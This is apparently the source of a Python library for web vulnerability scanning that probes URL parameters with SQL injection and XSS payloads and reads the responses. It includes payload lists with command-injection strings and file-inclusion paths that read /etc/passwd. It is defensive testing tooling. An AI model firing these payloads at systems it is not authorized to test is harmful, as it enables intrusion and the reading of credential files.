"""
Native Vulnerability Detection Library

Pure Python implementation of vulnerability detection techniques.
No external CLI tools required - uses only Python libraries.

Features:
- Time-based blind SQL injection detection
- Comparison-based SQL injection detection
- Error-based SQL injection detection
- XSS reflection and context analysis
- Command injection detection

This module extracts techniques from tools like sqlmap and xsstrike
but implements them as pure Python functions.
"""

import re
import time
import hashlib
import difflib
import logging
import requests
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

logger = logging.getLogger(__name__)


class VulnType(Enum):
    SQLI = "sqli"
    XSS = "xss"
    RCE = "rce"
    LFI = "lfi"
    SSTI = "ssti"


class DetectionTechnique(Enum):
    ERROR_BASED = "error-based"
    TIME_BASED = "time-based"
    BOOLEAN_BASED = "boolean-based"
    UNION_BASED = "union-based"
    REFLECTION = "reflection"
    CONTENT_BASED = "content-based"


@dataclass
class DetectionResult:
    """Result from vulnerability detection"""
    vulnerable: bool
    vuln_type: VulnType
    technique: DetectionTechnique
    confidence: float  # 0.0 - 1.0
    payload: str
    evidence: str
    extra_data: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            'vulnerable': self.vulnerable,
            'vuln_type': self.vuln_type.value,
            'technique': self.technique.value,
            'confidence': self.confidence,
            'payload': self.payload,
            'evidence': self.evidence,
            'extra_data': self.extra_data
        }


# =============================================================================
# PAYLOAD DATABASES
# =============================================================================

class PayloadDB:
    """Database of payloads extracted from security tools"""

    # SQL Injection payloads organized by technique
    SQLI_ERROR_BASED = [
        "'",
        "''",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' UNION SELECT NULL--",
        "' AND 1=CONVERT(int,@@version)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    ]

    SQLI_TIME_BASED = [
        # MySQL
        "' AND SLEEP(5)--",
        "' AND SLEEP(5)#",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR SLEEP(5)--",
        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT 1 FROM pg_sleep(5))--",
        # SQLite
        "' AND 1=randomblob(500000000)--",
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--",
    ]

    SQLI_BOOLEAN_BASED = [
        ("' AND 1=1--", "' AND 1=2--"),  # (true, false) pairs
        ("' AND 'a'='a", "' AND 'a'='b"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' AND SUBSTRING(@@version,1,1)='5", "' AND SUBSTRING(@@version,1,1)='X"),
    ]

    SQLI_UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,user(),3--",
        "' UNION SELECT 1,database(),3--",
    ]

    # XSS payloads
    XSS_BASIC = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '"><img src=x onerror=alert(1)>',
    ]

    XSS_FILTER_BYPASS = [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src=x onerror="alert(1)">',
        '<svg/onload=alert(1)>',
        '<img src=x onerror=alert`1`>',
        '{{constructor.constructor("alert(1)")()}}',
        '<a href="javascript:alert(1)">click</a>',
        '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">',
    ]

    # Command injection payloads
    RCE_PAYLOADS = [
        '; id',
        '| id',
        '|| id',
        '`id`',
        '$(id)',
        '; whoami',
        '| whoami',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '; ping -c 1 127.0.0.1',
        '| ping -c 1 127.0.0.1',
        # Windows
        '& whoami',
        '| dir',
        '; dir',
    ]

    # LFI payloads
    LFI_PAYLOADS = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '../../../etc/passwd%00',
        '..%2f..%2f..%2fetc/passwd',
        '/etc/passwd',
        'file:///etc/passwd',
        # Windows
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\boot.ini',
    ]

    # SQL error patterns for error-based detection
    SQL_ERRORS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"Microsoft.*SQL Server.*Driver",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"SQLite.*Exception",
        r"Warning.*sqlite_",
        r"You have an error in your SQL syntax",
        r"Unclosed quotation mark",
        r"syntax error at or near",
    ]


# =============================================================================
# SQLI DETECTOR
# =============================================================================

class SQLiDetector:
    """
    SQL Injection detection using multiple techniques.

    Techniques:
    1. Error-based: Look for SQL errors in response
    2. Time-based: Measure response time with SLEEP payloads
    3. Boolean-based: Compare responses for true/false conditions
    4. UNION-based: Detect successful UNION injection
    """

    def __init__(self,
                 session: Optional[requests.Session] = None,
                 timeout: int = 10,
                 time_threshold: float = 4.0,
                 similarity_threshold: float = 0.95):
        """
        Args:
            session: requests Session with cookies/auth
            timeout: Request timeout in seconds
            time_threshold: Seconds to wait for time-based detection
            similarity_threshold: Threshold for boolean-based comparison
        """
        self.session = session or requests.Session()
        self.timeout = timeout
        self.time_threshold = time_threshold
        self.similarity_threshold = similarity_threshold

        # Compile error patterns
        self._error_patterns = [
            re.compile(p, re.I) for p in PayloadDB.SQL_ERRORS
        ]

    def detect(self,
               url: str,
               parameter: str,
               method: str = "GET",
               data: Optional[Dict] = None,
               techniques: Optional[List[str]] = None) -> List[DetectionResult]:
        """
        Test a parameter for SQL injection.

        Args:
            url: Target URL
            parameter: Parameter to test
            method: HTTP method
            data: POST data
            techniques: List of techniques to use (default: all)

        Returns:
            List of DetectionResult for each finding
        """
        results = []

        if techniques is None:
            techniques = ['error', 'time', 'boolean', 'union']

        # Get baseline response
        baseline = self._get_baseline(url, parameter, method, data)
        if baseline is None:
            return results

        # Test each technique
        if 'error' in techniques:
            result = self._test_error_based(url, parameter, method, data)
            if result:
                results.append(result)

        if 'time' in techniques:
            result = self._test_time_based(url, parameter, method, data)
            if result:
                results.append(result)

        if 'boolean' in techniques:
            result = self._test_boolean_based(url, parameter, method, data, baseline)
            if result:
                results.append(result)

        if 'union' in techniques:
            result = self._test_union_based(url, parameter, method, data)
            if result:
                results.append(result)

        return results

    def _get_baseline(self,
                      url: str,
                      parameter: str,
                      method: str,
                      data: Optional[Dict]) -> Optional[requests.Response]:
        """Get baseline response for comparison"""
        try:
            if method.upper() == "GET":
                return self.session.get(url, timeout=self.timeout)
            else:
                return self.session.post(url, data=data, timeout=self.timeout)
        except Exception as e:
            logger.error(f"Failed to get baseline: {e}")
            return None

    def _inject_payload(self,
                        url: str,
                        parameter: str,
                        payload: str,
                        method: str,
                        data: Optional[Dict]) -> Optional[requests.Response]:
        """Inject payload into parameter"""
        try:
            if method.upper() == "GET":
                # Inject into URL
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                return self.session.get(new_url, timeout=self.timeout)
            else:
                # Inject into POST data
                new_data = (data or {}).copy()
                new_data[parameter] = payload
                return self.session.post(url, data=new_data, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"Injection failed: {e}")
            return None

    def _test_error_based(self,
                          url: str,
                          parameter: str,
                          method: str,
                          data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test for error-based SQL injection"""
        for payload in PayloadDB.SQLI_ERROR_BASED:
            response = self._inject_payload(url, parameter, payload, method, data)
            if response is None:
                continue

            # Check for SQL errors
            for pattern in self._error_patterns:
                match = pattern.search(response.text)
                if match:
                    return DetectionResult(
                        vulnerable=True,
                        vuln_type=VulnType.SQLI,
                        technique=DetectionTechnique.ERROR_BASED,
                        confidence=0.95,
                        payload=payload,
                        evidence=f"SQL error: {match.group()[:100]}",
                    )

        return None

    def _test_time_based(self,
                         url: str,
                         parameter: str,
                         method: str,
                         data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test for time-based blind SQL injection"""
        for payload in PayloadDB.SQLI_TIME_BASED:
            start_time = time.time()
            response = self._inject_payload(url, parameter, payload, method, data)
            elapsed = time.time() - start_time

            if response is None:
                continue

            # Check if response was delayed
            if elapsed >= self.time_threshold:
                # Verify with a non-delayed request
                verify_payload = payload.replace('5', '0').replace("'0:0:5'", "'0:0:0'")
                start_verify = time.time()
                self._inject_payload(url, parameter, verify_payload, method, data)
                verify_elapsed = time.time() - start_verify

                # Confirm if the delay was caused by the payload
                if elapsed - verify_elapsed >= self.time_threshold * 0.8:
                    return DetectionResult(
                        vulnerable=True,
                        vuln_type=VulnType.SQLI,
                        technique=DetectionTechnique.TIME_BASED,
                        confidence=0.90,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.1f}s",
                        extra_data={'delay': elapsed}
                    )

        return None

    def _test_boolean_based(self,
                            url: str,
                            parameter: str,
                            method: str,
                            data: Optional[Dict],
                            baseline: requests.Response) -> Optional[DetectionResult]:
        """Test for boolean-based blind SQL injection"""
        for true_payload, false_payload in PayloadDB.SQLI_BOOLEAN_BASED:
            true_resp = self._inject_payload(url, parameter, true_payload, method, data)
            false_resp = self._inject_payload(url, parameter, false_payload, method, data)

            if true_resp is None or false_resp is None:
                continue

            # Calculate similarity
            true_sim = self._calculate_similarity(baseline.text, true_resp.text)
            false_sim = self._calculate_similarity(baseline.text, false_resp.text)
            true_false_sim = self._calculate_similarity(true_resp.text, false_resp.text)

            # If true response is similar to baseline but false is different
            if (true_sim > self.similarity_threshold and
                false_sim < self.similarity_threshold and
                true_false_sim < self.similarity_threshold):
                return DetectionResult(
                    vulnerable=True,
                    vuln_type=VulnType.SQLI,
                    technique=DetectionTechnique.BOOLEAN_BASED,
                    confidence=0.85,
                    payload=f"TRUE: {true_payload} / FALSE: {false_payload}",
                    evidence=f"Response difference detected (sim: {true_false_sim:.2f})",
                    extra_data={
                        'true_similarity': true_sim,
                        'false_similarity': false_sim,
                    }
                )

        return None

    def _test_union_based(self,
                          url: str,
                          parameter: str,
                          method: str,
                          data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test for UNION-based SQL injection"""
        union_markers = ['@@version', 'user()', 'database()', 'VERSION()']

        for payload in PayloadDB.SQLI_UNION_BASED:
            response = self._inject_payload(url, parameter, payload, method, data)
            if response is None:
                continue

            # Check for UNION indicators
            for marker in union_markers:
                if marker.lower() in payload.lower():
                    # Look for version strings, usernames, etc.
                    version_patterns = [
                        r'\d+\.\d+\.\d+[-\w]*',  # MySQL version
                        r'PostgreSQL\s+\d+\.\d+',
                        r'Microsoft SQL Server',
                    ]
                    for pattern in version_patterns:
                        if re.search(pattern, response.text, re.I):
                            return DetectionResult(
                                vulnerable=True,
                                vuln_type=VulnType.SQLI,
                                technique=DetectionTechnique.UNION_BASED,
                                confidence=0.95,
                                payload=payload,
                                evidence=f"UNION injection successful",
                            )

        return None

    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """Calculate similarity ratio between two texts"""
        if not text1 or not text2:
            return 0.0
        # Use quick hash comparison first
        if hashlib.md5(text1.encode()).hexdigest() == hashlib.md5(text2.encode()).hexdigest():
            return 1.0
        # Use difflib for detailed comparison
        return difflib.SequenceMatcher(None, text1[:5000], text2[:5000]).ratio()


# =============================================================================
# XSS DETECTOR
# =============================================================================

class XSSDetector:
    """
    XSS detection using reflection analysis.

    Techniques:
    1. Reflection detection: Check if payload is reflected
    2. Context analysis: Determine HTML/JS/attribute context
    3. Filter bypass: Test encoding bypasses
    """

    def __init__(self,
                 session: Optional[requests.Session] = None,
                 timeout: int = 10):
        self.session = session or requests.Session()
        self.timeout = timeout

    def detect(self,
               url: str,
               parameter: str,
               method: str = "GET",
               data: Optional[Dict] = None) -> List[DetectionResult]:
        """Test a parameter for XSS"""
        results = []

        # Test basic payloads
        for payload in PayloadDB.XSS_BASIC:
            result = self._test_payload(url, parameter, payload, method, data)
            if result:
                results.append(result)
                break  # One confirmed XSS is enough

        # If basic failed, try filter bypass
        if not results:
            for payload in PayloadDB.XSS_FILTER_BYPASS:
                result = self._test_payload(url, parameter, payload, method, data)
                if result:
                    results.append(result)
                    break

        return results

    def _test_payload(self,
                      url: str,
                      parameter: str,
                      payload: str,
                      method: str,
                      data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test a single XSS payload"""
        try:
            if method.upper() == "GET":
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                response = self.session.get(new_url, timeout=self.timeout)
            else:
                new_data = (data or {}).copy()
                new_data[parameter] = payload
                response = self.session.post(url, data=new_data, timeout=self.timeout)

            # Check for reflection
            if payload in response.text:
                context = self._detect_context(response.text, payload)
                if context in ['html', 'attribute', 'javascript']:
                    return DetectionResult(
                        vulnerable=True,
                        vuln_type=VulnType.XSS,
                        technique=DetectionTechnique.REFLECTION,
                        confidence=0.90 if context == 'html' else 0.80,
                        payload=payload,
                        evidence=f"Reflected in {context} context",
                        extra_data={'context': context}
                    )

        except Exception as e:
            logger.debug(f"XSS test failed: {e}")

        return None

    def _detect_context(self, html: str, payload: str) -> str:
        """Detect the context where payload is reflected"""
        # Find payload position
        pos = html.find(payload)
        if pos == -1:
            return 'none'

        # Check surrounding context
        before = html[max(0, pos-100):pos]
        after = html[pos+len(payload):pos+len(payload)+100]

        # Check if in script tag
        if '<script' in before.lower() and '</script>' in after.lower():
            return 'javascript'

        # Check if in attribute
        attr_pattern = r'[\w-]+\s*=\s*["\']?[^"\']*$'
        if re.search(attr_pattern, before):
            return 'attribute'

        # Check if in HTML
        if re.search(r'<[^>]*$', before) or re.search(r'^[^<]*>', after):
            return 'tag'

        return 'html'


# =============================================================================
# UNIFIED DETECTOR
# =============================================================================

class VulnDetector:
    """
    Unified vulnerability detector using pure Python libraries.

    Usage:
        detector = VulnDetector(cookies={'PHPSESSID': 'xxx'})
        results = detector.scan(
            url='http://target/page.php',
            parameter='id',
            vuln_types=['sqli', 'xss']
        )
    """

    def __init__(self,
                 cookies: Optional[Dict[str, str]] = None,
                 headers: Optional[Dict[str, str]] = None,
                 timeout: int = 10,
                 verify_ssl: bool = False):
        """
        Initialize detector with session config.
        """
        self.session = requests.Session()
        self.session.verify = verify_ssl

        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)

        self.timeout = timeout
        self.sqli_detector = SQLiDetector(self.session, timeout)
        self.xss_detector = XSSDetector(self.session, timeout)

    def scan(self,
             url: str,
             parameter: str,
             method: str = "GET",
             data: Optional[Dict] = None,
             vuln_types: Optional[List[str]] = None) -> List[DetectionResult]:
        """
        Scan a parameter for vulnerabilities.

        Args:
            url: Target URL
            parameter: Parameter to test
            method: HTTP method
            data: POST data
            vuln_types: Types to test ('sqli', 'xss', 'rce', 'lfi')

        Returns:
            List of DetectionResult
        """
        results = []
        vuln_types = vuln_types or ['sqli', 'xss']

        if 'sqli' in vuln_types:
            sqli_results = self.sqli_detector.detect(url, parameter, method, data)
            results.extend(sqli_results)

        if 'xss' in vuln_types:
            xss_results = self.xss_detector.detect(url, parameter, method, data)
            results.extend(xss_results)

        return results

    def scan_endpoints(self,
                       endpoints: List[Dict],
                       max_workers: int = 3) -> List[DetectionResult]:
        """
        Scan multiple endpoints in parallel.

        Args:
            endpoints: List from crawler with 'url', 'parameters', etc.
            max_workers: Concurrent workers

        Returns:
            All detection results
        """
        all_results = []

        for endpoint in endpoints:
            url = endpoint.get('url', '')
            method = endpoint.get('method', 'GET')

            for param in endpoint.get('parameters', []):
                param_name = param.get('name', '')
                predicted = param.get('predicted_vulns', [])

                # Get vuln types to test
                vuln_types = list(set(v.get('type', '') for v in predicted))

                if vuln_types:
                    results = self.scan(url, param_name, method, vuln_types=vuln_types)
                    all_results.extend(results)

        return all_results
